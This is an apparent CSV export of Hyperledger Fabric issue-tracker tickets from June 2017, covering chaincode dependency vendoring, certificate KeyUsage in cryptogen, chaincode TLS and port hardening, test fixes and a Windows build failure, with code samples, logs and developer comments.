Chaincode vendor dependencies placed into the wrong folder while packing chaincode,FAB-4883,18417,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,20/Jun/17 8:31 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Jul/17 9:11 PM,v1.0.0-alpha2,,,v1.0.0,,fabric-peer,,,,,,0,peer,,,,,,"If chaincode has external dependency on the vendored library this dependency will be misplaced while preparing a packaging. For example, having following CC:

{code}
package main

import (
	""fmt""

	""github.com/golang/protobuf/proto""
	""github.com/hyperledger/fabric/core/chaincode/shim""
	""github.com/hyperledger/fabric/protos/msp""
	""github.com/hyperledger/fabric/protos/peer""
)

type MyChaincode struct {
}

func (MyChaincode) Init(stub shim.ChaincodeStubInterface) peer.Response {
	fmt.Println(""Init"")
	return shim.Success(nil)
}

func (MyChaincode) Invoke(stub shim.ChaincodeStubInterface) peer.Response {
	bytes, err := stub.GetCreator()
	fmt.Println(bytes)
	if err != nil {
		fmt.Println(""Error"", err)
	}

	sId := &msp.SerializedIdentity{}
	proto.Unmarshal(bytes, sId)
	fmt.Println(sId)

	return shim.Success(nil)
}

func main() {
	err := shim.Start(new(MyChaincode))
	if err != nil {
		fmt.Printf(""Error starting Simple chaincode: %s"", err)
	}
}
{code}

the output of the {{go list -f '{{join .Deps ""\""}} '}} command related to `protobuf` dependency will be following:

{code}
github.com/hyperledger/fabric/vendor/github.com/golang/protobuf/proto
github.com/hyperledger/fabric/vendor/github.com/golang/protobuf/ptypes/any
github.com/hyperledger/fabric/vendor/github.com/golang/protobuf/ptypes/empty
github.com/hyperledger/fabric/vendor/github.com/golang/protobuf/ptypes/timestamp
github.com/hyperledger/fabric/vendor/google.golang.org/genproto/googleapis/rpc/status
{code}

Therefore while packing based on the code:

{code}
	// --------------------------------------------------------------------------------------
	// Reclassify and sort the files:
	//
	// Two goals:
	//   * Remap non-package dependencies to package/vendor
	//   * Sort the final filename so the tarball at least looks sane in terms of package grouping
	// --------------------------------------------------------------------------------------
	files := make(Sources, 0)
	pkgPath := filepath.Join(""src"", code.Pkg)
	vendorPath := filepath.Join(pkgPath, ""vendor"")
	for _, file := range fileMap {
		// Vendor any packages that are not already within our chaincode's primary package.  We
		// detect this by checking the path-prefix.  Anything that is prefixed by ""src/$pkg""
		// (which includes the package itself and anything explicitly vendored in ""src/$pkg/vendor"")
		// are left unperturbed.  Everything else is implicitly vendored under src/$pkg/vendor by
		// simply remapping ""src"" -> ""src/$pkg/vendor"" in the tarball index.
		if strings.HasPrefix(file.Name, pkgPath) == false {
			origName := file.Name
			file.Name = strings.Replace(origName, ""src"", vendorPath, 1)
			logger.Debugf(""vendoring %s -> %s"", origName, file.Name)
		}

		files = append(files, file)
	}

	sort.Sort(files)
{code}

it will be placed into {{go/mychaincode/vendor/github.com/hyperledger/fabric/vendor/github.com/golang/protobuf/proto}} folder instead of {{go/mychaincode/vendor/github.com/golang/protobuf}}",,C0rWin,greg.haskins,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy50f:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,greg.haskins,mastersingh24,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/Jun/17 10:52 PM;greg.haskins;I think the basic issue is that we probably cannot support chaincode that lives under github.com/hyperledger/fabric due to fabric/vendoring.  In summary, code that lives under fabric would be packaged with fabric's vendoring, but compiled outside of it.  This has the net effect of isolating the chaincode from some of its dependencies during the compilation phase.

While this is a surprise discovery, it is not IMO a very big deal: real chaincode would never live under fabric, and even our samples are already proposed to move elsewhere (fabric-samples) for unrelated reasons.;;;","21/Jun/17 10:43 AM;greg.haskins;Thinking about this some more, I think we can fix it.  I will experiment.;;;","05/Jul/17 5:47 AM;muralisr;Making sure to understand the issue here.

Assume a chaincode ""src/github.com/hyperledger/fabric/mycc/mycc.go"" with an import ""github.com/golang/protobuf/proto"".

When a  dependency DEP gets packaged for mycc, it gets pushed into mycc's vendor ""src/github.com/hyperledger/fabric/mycc/vendor"" giving raise to  *src/github.com/hyperledger/fabric/mycc/vendor*/DEP.

The import ""github.com/golang/protobuf/proto"" resolves to the following dependency as its already in the fabric's vendor.

DEP=""github.com/hyperledger/fabric/vendor/github.com/golang/protobuf/proto""

Substituting for DEP, this becomes

""*src/github.com/hyperledger/fabric/mycc/vendor*/github.com/hyperledger/fabric/vendor/github.com/golang/protobuf/proto"".

While looking weird, it does give raise to a valid chaincode that gets built and runs without issue. Are we saying we could do a bit of extra work to fold this into ""*src/github.com/hyperledger/fabric/mycc/vendor*/github.com/golang/protobuf/proto"". I'd view this as unnecessary as the original one is not technically incorrect.

But perhaps I'm missing somethig [~C0rWin] [~greg.haskins] ?

 ;;;","07/Jul/17 9:27 PM;greg.haskins;Sorry [~muralisr], on vacation and didn't notice your comment above until now.

What we were saying is that consider the following scenario:

1) chaincode package foo/bar/baz that imports DEP

2) Within the GOPATH, DEP is satisfied by foo/vendor/DEP

3) After packing in the original way, we end up with foo/bar/baz/vendor/foo/vendor/DEP

4) DEP becomes inaccessible to foo/bar/baz, since it is no longer part of its vendored path but rather is a subvendored library of the vendored package ""foo"".

This has now been corrected.;;;","07/Jul/17 9:47 PM;muralisr;[~greg.haskins] right .. but only when the CC is under fabric/ (arguably not a good practice). When chaincode *not* under fabric/ we maybe dealing with two different types really - the one chaincode is accessing and the other, the vendored type the fabric is accessing. And user may not want to mix those types.  

I'm not sure there's a ""right"" way to do this given the vendoring restrictions.

 ;;;","07/Jul/17 9:59 PM;greg.haskins;I suspect lots of what we did w.r.t. golang packaging is a bit unnatural in fabric.  For instance, multiple packages (fabric/peer, fabric/orderer, fabric/core/chaincode/shim) under one vendor folder fabric/vendor.  I don't suspect this would be common.  However, the notion of a hierarchical vendor seems to be something that golang deps support natively so I solved the problem generically.  I suspect it will only come into play when dealing with fabric/examples/chaincode in the wild, but the support is now there nonetheless.;;;","07/Jul/17 11:04 PM;C0rWin;Still not sure 100% if this is related, but:

If you try to run the docker compose network based on: https://github.com/C0rWin/pgdays/tree/master/network

and following commands executed in **cli** container ({{docker exec -it cli /bin/bash}}):

{code}
    peer channel create -o orderer.example.com:7050 -c mychannel -f channel-artifacts/channel.tx
    peer channel join -o orderer.example.com:7050 --blockpath mychannel.block
    peer chaincode install -n accMgmt -v 1.0 -p github.com/hyperledger/fabric/examples/chaincode/go/account
{code}

leads to the following error:

{code}
2017-07-07 13:53:16.121 UTC [golang-platform] func1 -> DEBU 009 Discarding provided package github.com/hyperledger/fabric/core/chaincode/shim
2017-07-07 13:53:16.122 UTC [golang-platform] func1 -> DEBU 00a Discarding provided package github.com/hyperledger/fabric/protos/peer
Error: Error getting chaincode code chaincode: Error getting chaincode package bytes: Error obtaining dependencies for github.com/hyperledger/fabric/common/util: <go, [list -f {{ join .Deps ""\n""}} github.com/hyperledger/fabric/common/util]>: failed with error: ""exit status 1""
can't load package: package github.com/hyperledger/fabric/common/util: cannot find package ""github.com/hyperledger/fabric/common/util"" in any of:
        /opt/go/src/github.com/hyperledger/fabric/common/util (from $GOROOT)
        /opt/gopath/src/github.com/hyperledger/fabric/common/util (from $GOPATH)
{code}

Running same commands from dev environment on my laptop has no problem, chaincode got installed into peer.;;;","08/Jul/17 12:14 AM;mastersingh24;[~C0rWin]  - the issue here is that fabric-tools does not include the fabric source so it will not have access to the
 *github.com/hyperledger/fabric/common/util* package:



 
{noformat}
Garis-MBP:fabric gsingh$ docker run --rm -it hyperledger/fabric-tools bash
root@ea11f389bed3:/# echo $GOPATH
/opt/gopath
root@ea11f389bed3:/# ls /opt/gopath/
root@ea11f389bed3:/#
{noformat}
 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cryptogen needs to restrict KeyUsage for signing certificates,FAB-4884,18418,17897,Sub-task,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,mastersingh24,mastersingh24,20/Jun/17 8:50 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 5:35 PM,,,,v1.0.0,v1.0.0-rc1,fabric-tools,,,,,,0,,,,,,,"Cyrptogen currently generates certificates which are used for both signing and TLS and the certificates include KU= digital signature and EKU = server auth | client auth

FAB-4626 will modify the X509 MSP to disallow signing certificates which have EKU = server auth and/or client auth.  This means that cryptogen now needs to generate separate certificates for signing and TLS and make sure each has the appropriate KU and EKU",,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,";21/Jun/17 6:27 AM;mastersingh24;10800",,10800,0,10800,100%,10800,0,10800,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy50n:",,,,,,,,,,,,,,,,,,,,,,,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jun/17 6:27 AM;mastersingh24;https://gerrit.hyperledger.org/r/10865;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error while starting E2E,FAB-4885,18419,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,mahendranmahesh,mahendranmahesh,20/Jun/17 9:31 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Nov/17 12:29 PM,v1.0.0-beta,,,Future,,fabric-samples,,,,,,0,,,,,,,"I am just starting the hyperleder v.1.0 by executing ./network_setup.sh up.

It ended up with error.","OS : Oracle Enterprise Linux

         Linux 4.1.12-94.3.6.el6uek.x86_64

Docker version : Docker version 1.12.1, build 23cf638

docker-compose version 1.13.0, build 1719ceb

Hyperledger v.1.0 beta

 ",ChristopherFerris,denyeart,mahendranmahesh,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Jun/17 9:31 PM;mahendranmahesh;docker_logs.txt;https://jira.hyperledger.org/secure/attachment/11213/docker_logs.txt",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy50v:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,mahendranmahesh,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Jul/17 5:24 AM;ChristopherFerris;This may have been temporary instability. Can you reproduce thus using Fabric v1.0.0? ;;;","27/Nov/17 12:29 PM;denyeart;Not able to reproduce and have not heard back from reporter, will have to close.
[~mahendranmahesh] Please re-open if you can still reproduce on 1.0 or 1.1.0-preview.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update BDD to accomodate changes for placing TLS CA certs in proper locations,FAB-4886,18421,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jeffgarratt,jeffgarratt,jeffgarratt,20/Jun/17 10:59 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 4:31 AM,,,,,,,,,,,,0,,,,,,,,,jeffgarratt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,FAB-4626,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-1141,,,,,,,,,"1|hzy513:",,,,,,,,,,,,,,,,,,,,,,,jeffgarratt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"21/Jun/17 12:14 AM;jeffgarratt;Created new CR [https://gerrit.hyperledger.org/r/#/c/10841/]

 

Waiting for jobbuilder and reviews.  Once completed and merged [~adc] can rebase and pass behave.;;;","21/Jun/17 4:31 AM;jeffgarratt;Merged.  Closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[SECURITY] run chaincode on a separate (potentially internal) port than the peer port,FAB-4888,18436,18038,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,muralisr,muralisr,muralisr,21/Jun/17 2:00 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jun/17 1:02 PM,v1.0.0-beta,,,,,fabric-peer,,,,,,0,Security,,,,,,"This is one of the 3 tasks that needs to be done for securing chaincode streams. With this, chaincode streams need not be bound to the peers endpoint allowing more options for protecting it. There *may* be fringe benefits from that separation of traffic (including performance).",,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,FAB-4751,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy533:",,,,,,,,,,,,,,,,,,,,,,,muralisr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Jun/17 1:04 PM;muralisr;fixed by https://gerrit.hyperledger.org/r/#/c/10875/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE: add diagram to README for readbility,FAB-4891,18439,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,21/Jun/17 2:42 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:10 PM,,,,,,,,,,,,0,PTE,quality,,,,,Add a diagram of PTE to README to increase the readability and understanding of PTE,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy53b:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE tidy up require statements,FAB-4892,18440,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,john.d.sheehan,dongming,dongming,21/Jun/17 2:45 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,18/Jan/18 11:46 PM,,,,,,fabric-quality,,,,,,0,PTE,Quality,,,,,"PTE js codes cleanup:
[test/tools/PTE/pte-main.js|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-main.js]
Line [44|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-main.js@44]: you should not need to use these individual classes, all you need should be ""fabric-client"" itself and the newXXX() methods on the API
Line [45|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-main.js@45]: simplify the require to ""'fabric-ca-client""
Line [46|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-main.js@46]: you should not need this
Line [753|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-main.js@753]: should not need this any longer since there's no ""native"" channel configuration creation support in the SDKs
Line [776|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-main.js@776]: maybe forgot to clean up a temporary debugging statement?
[test/tools/PTE/pte-util.js|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-util.js]
Line [26|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-util.js@26]: simplify the require to just ""fabric-ca-client""
Line [30|https://gerrit.hyperledger.org/r/#/c/10589/1/test/tools/PTE/pte-util.js@30]: should not need any of these classes
Use logger instead of console.log",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy53j:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable mutual TLS between peer and its chaincodes,FAB-4894,18442,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,binhn,binhn,21/Jun/17 3:43 AM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,20/Oct/17 9:51 PM,,,,DUPLICATE,v1.1.0,fabric-peer,,,,,,0,Security,,,,,,"In FAB-4751, we brought up a security related issue with the chaincode communication with the peer, and we resolved the critical parts, namely eliminate external chaincode connections and use a private port. However the connection is server-side TLS, and we want to improve it by using mutual TLS.",,baohua,binhn,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,FAB-5406,,FAB-4447,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,FAB-10,,,,,,,,,"1|hzy53r:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,baohua,binhn,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix premature merge of new getting started,FAB-4896,18445,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,21/Jun/17 6:50 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/17 1:11 AM,v1.0.0-beta,,,WON'T FIX,,,,,,,,0,Documentation,,,,,,docs/source/getting_started.rst was prematurely updated with [https://gerrit.hyperledger.org/r/#/c/10507/] which was supposed to be held back until the release.,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy547:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test codes use incorrect package in common/tools/configtxlator/metadata,FAB-4897,18500,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nemoto,nemoto,nemoto,21/Jun/17 11:56 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Jul/17 1:49 AM,,,,v1.0.0,,fabric-quality,fabric-tools,,,,,0,,,,,,,"Test codes use incorrect package in common/tools/configtxlator/metadata. So, Jenkins reports 0% coverage in these packages.
 [https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-x86_64/2167/cobertura/]
  ",,nemoto,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy54f:",,,,,,,,,,,,,,,,,,,,,,,nemoto,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 3:09 AM;nnao;https://gerrit.hyperledger.org/r/#/c/10931/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test codes use incorrect package in orderer/metadata and the test fails,FAB-4898,18501,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,nemoto,nemoto,nemoto,21/Jun/17 11:56 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jun/17 1:11 AM,,,,v1.0.0,,fabric-orderer,fabric-quality,,,,,0,,,,,,,"Test codes use incorrect package in common/tools/configtxlator/metadata. So, Jenkins reports 0% coverage in these packages. 
[https://jenkins.hyperledger.org/view/fabric/job/fabric-merge-x86_64/2167/cobertura/]
 
Also, the test fails due to the unexpected version even if using the correct package.
{noformat}
(..snip..)
Creating unittest_unit-tests_1
Attaching to couchdb, unittest_vp_1, unittest_unit-tests_1
couchdb       | WARNING: no logs are available with the 'none' log driver
vp_1          | WARNING: no logs are available with the 'none' log driver
unit-tests_1  | Obtaining list of tests to run for the following packages: github.com/hyperledger/fabric/orderer/metadata DONE!
unit-tests_1  | Running tests...
unit-tests_1  | --- FAIL: TestGetVersionInfo (0.00s)
        Error Trace:    metadata_test.go:25
unit-tesError:|         Not equal: ""orderer:\n Version: TestVersion\n Go version: go1.7.5\n OS/Arch: linux/amd64"" (expected)
unit-tests_1  |                                 != ""orderer:\n Version: 1.0.0-rc1-snapshot-e28344b\n Go version: go1.7.5\n OS/Arch: linux/amd64"" (actual)
unit-tests_1  |
unit-tests_1  | FAIL
unit-tests_1  | coverage: 75.0% of statements
unit-tests_1  | FAIL    github.com/hyperledger/fabric/orderer/metadata  0.005s
unit-tests_1  | error: exit status 1
unittest_unit-tests_1 exited with code 1{noformat}
 ",,nemoto,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy54n:",,,,,,,,,,,,,,,,,,,,,,,nemoto,nnao,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 3:09 AM;nnao;https://gerrit.hyperledger.org/r/#/c/10935/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"peer package is failed on ""make dist-all""/ ""make release-all""",FAB-4899,18502,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,muralisr,rameshthoomu,rameshthoomu,21/Jun/17 11:58 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,23/Jun/17 6:44 AM,v1.0.0-beta,,,v1.0.0-rc1,,fabric-build,,,,,,0,build-system,,,,,,"Observed below error while doing ""*make dist-all*"" / ""*make release-all*""

*fabric commit*#6db44c7f5a5979dc5757c6d1343f333fcd907b18

 
{code:java}
1) Checkout to above commit number or clone fabric repo

2) cd fabric && make release-all.. Observed below error 
{code}
ubuntu@hyperledger-devenv:9cb5aba:/opt/gopath/src/github.com/hyperledger/fabric$ *make release-all*
 Building release/windows-amd64/bin/configtxgen for windows-amd64
 mkdir -p release/windows-amd64/bin
 CGO_CFLAGS="" "" GOOS=windows GOARCH=amd64 go build -o /opt/gopath/src/github.com/hyperledger/fabric/release/windows-amd64/bin/configtxgen -tags ""nopkcs11"" -ldflags ""-X github.com/hyperledger/fabric/common/configtx/tool/configtxgen/metadata.Version=1.0.0-rc1-snapshot-6db44c7"" github.com/hyperledger/fabric/common/configtx/tool/configtxgen
 Building release/windows-amd64/bin/cryptogen for windows-amd64
 mkdir -p release/windows-amd64/bin
 CGO_CFLAGS="" "" GOOS=windows GOARCH=amd64 go build -o /opt/gopath/src/github.com/hyperledger/fabric/release/windows-amd64/bin/cryptogen -tags ""nopkcs11"" -ldflags ""-X github.com/hyperledger/fabric/common/tools/cryptogen/metadata.Version=1.0.0-rc1-snapshot-6db44c7"" github.com/hyperledger/fabric/common/tools/cryptogen
 Building release/windows-amd64/bin/configtxlator for windows-amd64
 mkdir -p release/windows-amd64/bin
 CGO_CFLAGS="" "" GOOS=windows GOARCH=amd64 go build -o /opt/gopath/src/github.com/hyperledger/fabric/release/windows-amd64/bin/configtxlator -tags ""nopkcs11"" -ldflags ""-X github.com/hyperledger/fabric/common/tools/configtxlator/metadata.Version=1.0.0-rc1-snapshot-6db44c7"" github.com/hyperledger/fabric/common/tools/configtxlator
 Building release/windows-amd64/bin/peer for windows-amd64
 mkdir -p release/windows-amd64/bin
 CGO_CFLAGS="" "" GOOS=windows GOARCH=amd64 go build -o /opt/gopath/src/github.com/hyperledger/fabric/release/windows-amd64/bin/peer -tags ""nopkcs11"" -ldflags ""-X github.com/hyperledger/fabric/peer/metadata.Version=1.0.0-rc1-snapshot-6db44c7"" github.com/hyperledger/fabric/peer
{code:java}
# github.com/hyperledger/fabric/peer/node
peer/node/start.go:306: undefined: syscall.Flock
peer/node/start.go:306: undefined: syscall.LOCK_EX
peer/node/start.go:306: undefined: syscall.LOCK_NB
peer/node/start.go:326: undefined: syscall.Flock
peer/node/start.go:326: undefined: syscall.LOCK_UN
Makefile:354: recipe for target 'release/windows-amd64/bin/peer' failed
make: *** [release/windows-amd64/bin/peer] Error 2

{code}",Tested on vagrant/non-vagrant,muralisr,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy54v:",,,,,,,,,,,,,,,,,,,,,,,muralisr,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"22/Jun/17 2:43 AM;muralisr;As far I can tell syscall.Flock (and other syscalls) is not available on Windows.

This stems from https://gerrit.hyperledger.org/r/#/c/10583

We could
